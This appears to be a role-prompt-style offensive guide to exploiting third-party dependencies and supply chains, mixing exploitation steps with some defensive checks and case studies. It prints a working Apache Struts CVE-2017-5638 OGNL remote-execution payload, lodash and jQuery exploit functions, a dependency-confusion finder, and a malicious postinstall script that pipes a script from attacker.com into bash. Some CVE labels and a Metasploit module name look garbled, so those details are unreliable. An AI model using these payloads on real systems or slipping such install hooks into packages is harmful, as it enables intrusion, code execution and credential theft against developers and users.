# Third-Party Component Chains: Supply Chain and Dependency Exploitation

## Expert Role Definition
You are a principal supply chain security researcher specializing in third-party component vulnerability exploitation and dependency chain attacks. You have deep expertise in identifying and chaining vulnerabilities in open-source libraries, frameworks, CMS plugins, and build tools. You understand how a single vulnerable dependency can compromise an entire application, and you know how to find these dependencies, identify their vulnerabilities, and chain them into full system compromise. You think in terms of dependency graphs, version analysis, and the cascading impact of vulnerabilities in shared code. You can identify vulnerable jQuery, lodash, moment.js, and other common libraries, and chain their flaws with application-specific vulnerabilities. You are the foremost authority on weaponizing third-party components for maximum impact.

## Core Concepts

Third-party component chains exploit vulnerabilities in libraries, frameworks, plugins, and dependencies that applications rely on. The attack surface includes: known CVEs in outdated packages, dependency confusion attacks, supply chain compromises, vulnerable CMS plugins, and insecure build tool configurations.

The primary vulnerability classes include:

1. **Known CVE Exploitation**: Using publicly disclosed vulnerabilities in specific library versions. Many applications run outdated dependencies with known exploits available.

2. **Outdated Dependency Attacks**: Targeting libraries that haven't been updated, where accumulated vulnerabilities create multiple attack paths.

3. **Dependency Confusion**: Injecting malicious packages into private registries by publishing packages with the same name as internal packages on public registries.

4. **Supply Chain Compromise**: Compromising legitimate packages at the source (npm, pip, PyPI) to inject malicious code that executes during installation.

5. **Vulnerable JavaScript Libraries**: jQuery, lodash, moment.js, and other widely-used libraries with known XSS, prototype pollution, or prototype pollution vulnerabilities.

6. **Vulnerable Server-Side Libraries**: Apache Struts, Spring Framework, Express.js, Django, and other frameworks with critical vulnerabilities.

7. **Deserialization in Third-Party Components**: Java deserialization, Python pickle, PHP unserialization vulnerabilities in component libraries.

8. **RCE in Build Tools**: Webpack, Gulp, Grunt, and other build tools that execute arbitrary code during builds.

The exploitation chain typically follows: **Identify dependencies → Find vulnerable versions → Exploit known CVEs → Chain with application vulnerabilities → Full compromise**.

## Pre-requisite Knowledge

1. Package managers: npm, pip, Maven, NuGet, Composer, Gem management
2. Dependency resolution: transitive dependencies, version conflicts, lock files
3. CVE databases: NVD, GitHub Advisory, Snyk Vulnerability Database
4. Software Composition Analysis (SCA) tools: npm audit, safety, OWASP Dependency-Check
5. Build systems: Webpack, Gulp, Grunt, Maven, Gradle configuration
6. CMS ecosystems: WordPress plugins, Drupal modules, Joomla extensions
7. Container security: Docker image layer analysis, base image vulnerabilities
8. SBOM (Software Bill of Materials): CycloneDX, SPDX formats

## Chain Architecture / Attack Flow Diagram

```
+------------------------------------------------------------------+
|           THIRD-PARTY COMPONENT EXPLOITATION CHAIN                 |
+------------------------------------------------------------------+
|                                                                    |
|  Discovery:                                                       |
|  [package.json] [requirements.txt] [pom.xml] [composer.json]     |
|      |            |              |            |                    |
|      v            v              v            v                    |
|  +----------------------------------------------------------+    |
|  |           Dependency Analysis Layer                        |    |
|  |                                                           |    |
|  |  Enumerate all direct and transitive dependencies         |    |
|  |  Map versions against CVE databases                       |    |
|  |  Identify vulnerable code paths in application            |    |
|  +--------------------------+--------------------------------+    |
|                              |                                     |
|  Exploitation Paths:         v                                     |
|  +----------------------------------------------------------+    |
|  |  Known CVE: Exploit public exploit for vulnerable lib    |    |
|  |  Prototype Pollution: lodash/jQuery pollution chains      |    |
|  |  Deserialization: Unsafe object deserialization           |    |
|  |  Supply Chain: Malicious package execution                |    |
|  |  Build Tool RCE: Webpack/Gulp arbitrary code              |    |
|  |  CMS Plugin: WordPress/Drupal plugin vulnerabilities      |    |
|  |  Dependency Confusion: Inject malicious packages          |    |
|  +--------------------------+--------------------------------+    |
|                              |                                     |
|  Impact:                     v                                     |
|  [RCE] [Data Theft] [Supply Chain Backdoor] [Full Compromise]   |
+------------------------------------------------------------------+
```

## Step-by-Step Exploitation Methodology

### Phase 1: Dependency Enumeration

**Step 1: Identify all dependencies**
```bash
# JavaScript/npm
cat package.json | jq '.dependencies, .devDependencies'
npm ls --all --json > dependencies.json

# Python
cat requirements.txt
pip list --format=json > dependencies.json

# Java
cat pom.xml | grep -A 5 '<dependency>'
mvn dependency:tree > dependencies.txt

# PHP
cat composer.json | jq '.require, .require-dev'
composer show --format=json > dependencies.json
```

**Step 2: Scan for known vulnerabilities**
```bash
# npm audit
npm audit --json > vulnerabilities.json

# Python safety check
safety check --json > vulnerabilities.json

# OWASP Dependency-Check
dependency-check --project "Target" --scan . --format JSON

# Snyk
snyk test --json > vulnerabilities.json
```

### Phase 2: Vulnerability Research

**Step 3: Research specific CVEs**
```python
import requests
import json

def research_cve(library, version):
    """Research CVEs for specific library version"""
    # NVD API
    url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={library}"
    r = requests.get(url)
    cves = r.json().get('vulnerabilities', [])
    
    for cve in cves:
        cve_id = cve['cve']['id']
        descriptions = cve['cve']['descriptions']
        desc = next(d['value'] for d in descriptions if d['language'] == 'en')
        print(f"[CVE] {cve_id}: {desc[:100]}")
    
    return cves
```

**Step 4: Check for available exploits**
```python
# Search for public exploits
def find_exploits(cve_id):
    """Find public exploits for CVE"""
    # Exploit-DB
    r = requests.get(f"https://www.exploit-db.com/search?cve={cve_id}")
    
    # GitHub exploits
    r = requests.get(f"https://api.github.com/search/repositories?q={cve_id}")
    
    # Metasploit modules
    r = requests.get(f"https://www.rapid7.com/db/modules/?q={cve_id}")
    
    return r.text
```

### Phase 3: Exploit Development

**Step 5: Exploit jQuery prototype pollution (CVE-2020-11022)**
```python
import requests

def exploit_jquery_xss(url):
    """Exploit jQuery XSS via prototype pollution"""
    payload = '<img src=x onerror=alert(1)>'
    
    # jQuery before 3.5.0 allows XSS via html() with untrusted input
    data = {
        'name': payload,
        'description': 'Test data'
    }
    
    r = requests.post(f'{url}/api/profile', json=data)
    return r.text
```

**Step 6: Exploit lodash prototype pollution (CVE-2020-8203)**
```python
def exploit_lodash_pollution(url):
    """Exploit lodash prototype pollution for RCE"""
    # Craft malicious JSON that pollutes Object.prototype
    payload = {
        'constructor': {
            'prototype': {
                'isAdmin': True
            }
        }
    }
    
    r = requests.post(f'{url}/api/merge', json=payload)
    
    # Now check if admin access is granted
    r = requests.get(f'{url}/admin', cookies=cookies)
    return r.status_code == 200
```

**Step 7: Exploit Apache Struts (CVE-2017-5638)**
```python
def exploit_struts_rce(url):
    """Exploit Apache Struts Content-Type RCE"""
    headers = {
        'Content-Type': "%{(#_='multipart/form-data')."
        "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        "(#_memberAccess?(#_memberAccess=#dm):"
        "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        "(#ognlUtil.getExcludedPackageNames().clear())."
        "(#ognlUtil.getExcludedClasses().clear())."
        "(#context.setMemberAccess(#dm))))."
        "(#cmd='id')."
        "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        "(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd}))."
        "(#p=new java.lang.ProcessBuilder(#cmds))."
        "(#p.redirectErrorStream(true)).(#process=#p.start())."
        "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        "(#ros.flush())}"
    }
    
    r = requests.post(url, headers=headers)
    return r.text
```

### Phase 4: Supply Chain Attacks

**Step 8: Identify dependency confusion opportunities**
```python
def check_dependency_confusion(org_name):
    """Check for dependency confusion opportunities"""
    # Read package lists
    with open('package.json') as f:
        packages = json.load(f)
    
    internal_packages = []
    for pkg in packages.get('dependencies', {}):
        # Check if package exists on public registry
        r = requests.get(f'https://registry.npmjs.org/{pkg}')
        if r.status_code == 404:
            print(f"[VULN] Package '{pkg}' not on npm - dependency confusion possible")
            internal_packages.append(pkg)
    
    return internal_packages
```

## Tool Arsenal

```bash
# npm audit
npm audit
npm audit fix --force

# OWASP Dependency-Check
dependency-check --project "Target" --scan . --format HTML

# Snyk
snyk test
snyk wizard

# Yarn audit
yarn audit

# Safety (Python)
safety check
safety check --json

# Retire.js for JavaScript
retire --js --path /path/to/app

# Check for outdated packages
npm outdated
pip list --outdated

# Manual CVE research
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=jquery" | jq '.vulnerabilities[].cve.id'

# Metasploit for known exploits
msfconsole -x "search apache struts; use exploit/multi/http/struts2_content_type_ohmygnome; show options"

# Burp Suite: Use Software Vulnerability Scanner extension
# Install: BApp Store -> Software Vulnerability Scanner
```

## Real-World Case Studies

### Case Study 1: Equifax Breach via Apache Struts (CVE-2017-5638)
The Equifax breach exposed 147 million records through exploitation of Apache Struts CVE-2017-5638. The vulnerability existed in the Jakarta Multipart parser, allowing RCE via crafted Content-Type headers. Attackers exploited the unpatched vulnerability to access the dispute portal, then moved laterally through the network. The impact: $700 million settlement, 147 million exposed records, complete reputation damage. Root cause: failure to patch a known critical vulnerability in a timely manner.

### Case Study 2: event-stream NPM Supply Chain Attack (2018)
The event-stream npm package was taken over by a malicious actor who added code targeting the Copay Bitcoin wallet. The malicious code was added as a dependency (flatmap-stream) that was obfuscated. The attack: (1) maintainer transferred package ownership, (2) new maintainer added malicious dependency, (3) the code executed only in specific environment (Copay wallet), (4) stole Bitcoin private keys. Impact: unknown amount of Bitcoin stolen. Lesson: supply chain attacks can target specific users of a package.

### Case Study 3: jQuery Prototype Pollution to XSS (CVE-2020-11022/CVE-2020-11023)
Multiple web applications using jQuery versions before 3.5.0 were vulnerable to XSS through the `html()` method when processing untrusted HTML. The vulnerability allowed attackers to inject arbitrary HTML/JavaScript through form fields that were rendered using jQuery's DOM manipulation methods. This was chained with CSRF vulnerabilities to achieve full account takeover on several CMS platforms.

### Case Study 4: Struts2-045 (CVE-2017-5638) Mass Scanning
Security researchers discovered over 8,000 Apache Struts instances vulnerable to CVE-2017-5638 within 24 hours of the vulnerability disclosure. The exploit was simple: send a crafted Content-Type header with OGNL expressions. Many organizations had not yet patched from the previous Struts vulnerability (CVE-2016-3093), demonstrating how unpatched dependencies create cascading risk.

### Case Study 5: Python Package Typosquatting
Malicious packages were published to PyPI with names similar to popular packages (e.g., 'python-dateutil2' instead of 'python-dateutil'). These packages contained code that exfiltrated environment variables, SSH keys, and AWS credentials when installed. The attack exploited developer typing errors during package installation. Impact: credential theft from development environments.

## Bypass Techniques and Evasion

### Bypass 1: Transitive Dependency Exploitation
```python
# Attack deep transitive dependencies that aren't audited
# npm ls --all reveals all nested dependencies
import subprocess
result = subprocess.run(['npm', 'ls', '--all', '--json'], capture_output=True, text=True)
deps = json.loads(result.stdout)

def find_vulnerable_transitive(deps, vulnerable_list):
    """Find vulnerable packages in transitive dependencies"""
    for pkg, info in deps.get('dependencies', {}).items():
        if pkg in vulnerable_list:
            print(f"[VULN] Transitive dep: {pkg}@{info.get('version')}")
        find_vulnerable_transitive(info, vulnerable_list)
```

### Bypass 2: Polyglot Package Attack
```python
# Create package that works in multiple ecosystems
# package.json for npm, setup.py for PyPI, pom.xml for Maven
# Different malicious payloads for each ecosystem
```

### Bypass 3: Post-Install Script Abuse
```json
// package.json with malicious postinstall script
{
  "scripts": {
    "postinstall": "node -e \"require('child_process').exec('curl https://attacker.com/shell | bash')\""
  }
}
```

### Bypass 4: Version Range Exploitation
```json
// Package specifies wide version range
{
  "dependencies": {
    "vulnerable-lib": ">=1.0.0 <4.0.0"
  }
}
// If any version in range is vulnerable, application affected
```

### Bypass 5: Lock File Poisoning
```bash
# Modify package-lock.json to point to malicious version
# When npm install runs, it uses lock file versions
# If lock file is committed to repo, developers pull malicious version
```

## Defensive Indicators / Detection

### Dependency Monitoring
```bash
# Regular audit commands
npm audit --production
safety check -r requirements.txt
snyk test --severity-threshold=high

# Monitor for new CVEs
# Subscribe to security advisories for all dependencies
```

### Build-Time Detection
```python
# Check for suspicious postinstall scripts
import json

def check_malicious_scripts(package_json_path):
    with open(package_json_path) as f:
        pkg = json.load(f)
    
    suspicious_scripts = ['postinstall', 'preinstall', 'install']
    for script in suspicious_scripts:
        if script in pkg.get('scripts', {}):
            print(f"[WARNING] Suspicious script: {script}: {pkg['scripts'][script]}")
```

### Runtime Detection
```python
# Monitor for unexpected network connections during package installation
import subprocess
import re

def monitor_install():
    # Run npm install with strace to monitor connections
    result = subprocess.run(['strace', '-e', 'connect', 'npm', 'install'],
        capture_output=True, text=True)
    
    for line in result.stderr.split('\n'):
        if 'connect' in line and 'AF_INET' in line:
            ip = re.search(r'sin_addr=inet\("([^"]+)"\)', line)
            if ip and not ip.group(1).startswith('10.'):
                print(f"[WARNING] External connection: {ip.group(1)}")
```

## Impact Assessment Framework

| Factor | Score | Notes |
|--------|-------|-------|
| Confidentiality | CRITICAL | Full application compromise |
| Integrity | CRITICAL | Code injection, backdoors |
| Availability | HIGH | Supply chain disruption |
| Complexity | LOW | Public exploits available |
| Privileges | NONE | Unauthenticated exploitation |
| User Interaction | NONE | Automatic during package use |
| Scope | CHANGED | Affects all application users |

**CVSS 3.1**: 10.0 (Critical) - AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

## Common Pitfalls and Anti-Patterns

1. Not running npm audit or equivalent regularly
2. Ignoring transitive dependencies in security assessments
3. Using package-lock.json from untrusted sources
4. Not pinning dependency versions in production
5. Running npm install with root privileges
6. Not scanning Docker images for vulnerable dependencies
7. Using --force flag with npm audit fix without reviewing changes
8. Not monitoring for new CVEs after deployment

## Advanced Variations

### Variation 1: Monorepo Dependency Poisoning
```javascript
// In monorepo, compromised package affects all projects
// Package may check for monorepo indicators before executing payload
if (process.env.LERNA_ROOT_PATH) {
    // Monorepo detected - execute payload
    require('child_process').exec('malicious_script');
}
```

### Variation 2: CI/CD Pipeline Exploitation
```yaml
# GitHub Actions workflow with vulnerable action
- uses: vulnerable-org/vulnerable-action@v1
  with:
    # Malicious action executes during build
```

### Variation 3: Container Base Image Exploitation
```dockerfile
# Vulnerable base image with known CVEs
FROM ubuntu:18.04  # Contains multiple known vulnerabilities
RUN apt-get update && apt-get install -y vulnerable-package
# Every container built from this image is vulnerable
```

## Integration with Other Chains

1. **RCE Chains**: Third-party CVE exploitation leads directly to remote code execution
2. **XSS Chains**: Vulnerable jQuery/lodash enables XSS in application functionality
3. **Supply Chain Chains**: Compromised dependency creates persistent backdoor
4. **Privilege Escalation Chains**: Vulnerable CMS plugins provide admin access
5. **Data Exfiltration Chains**: Vulnerable libraries leak sensitive data
6. **Persistence Chains**: Malicious postinstall scripts maintain access

## Reporting and Documentation

### Report Template
```
Title: Vulnerable Third-Party Component [Library] [Version]

Summary: The application uses [Library] version [X.Y.Z] which contains
[CVE-ID], a [vulnerability type] vulnerability.

Impact: An attacker can [specific exploitation], resulting in [impact].

PoC: [Steps to reproduce using the vulnerable dependency]

Recommendation: Upgrade [Library] to version [X.Y.Z] or later.
Implement automated dependency scanning in CI/CD pipeline.
```

## Practice Labs and Exercises

### Lab 1: jQuery Prototype Pollution
```bash
# Deploy application with jQuery < 3.5.0
# Goal: Achieve XSS via prototype pollution
# Hint: Use the html() method with untrusted input
```

### Lab 2: Struts2 RCE
```bash
# Deploy vulnerable Apache Struts application
# Goal: Achieve RCE via Content-Type header
# Hint: Use OGNL injection payload
```

### Lab 3: Dependency Confusion
```bash
# Create private npm packages with common names
# Goal: Identify and exploit dependency confusion
# Hint: Check if internal packages exist on public registry
```

## Ethical Guidelines

1. Only test third-party vulnerabilities on systems you own or have authorization
2. Do not publish malicious packages to public registries
3. Do not exploit supply chain vulnerabilities in production systems
4. Report dependency vulnerabilities to both the library maintainer and application developer
5. Understand that dependency vulnerabilities affect all users of the application
6. Do not use dependency confusion to access data beyond scope of testing
7. Document all dependency analysis and provide upgrade paths in reports

## Quick Reference Cheat Sheet

| Library | CVE | Type | Exploit |
|---------|-----|------|---------|
| jQuery < 3.5.0 | CVE-2020-11022 | XSS | html() pollution |
| lodash < 4.17.21 | CVE-2021-23337 | Command Injection | template() |
| Struts2 < 2.3.32 | CVE-2017-5638 | RCE | Content-Type OGNL |
| event-stream | - | Supply Chain | Malicious dependency |
| express < 4.17.3 | CVE-2022-24999 | Prototype Pollution | qs module |
| node-fetch < 2.6.7 | CVE-2022-0235 | Info Leak | Header exposure |

### Key Commands
```bash
npm audit --production
snyk test --severity-threshold=high
safety check -r requirements.txt
dependency-check --scan . --format HTML
retire --js --path /app
```
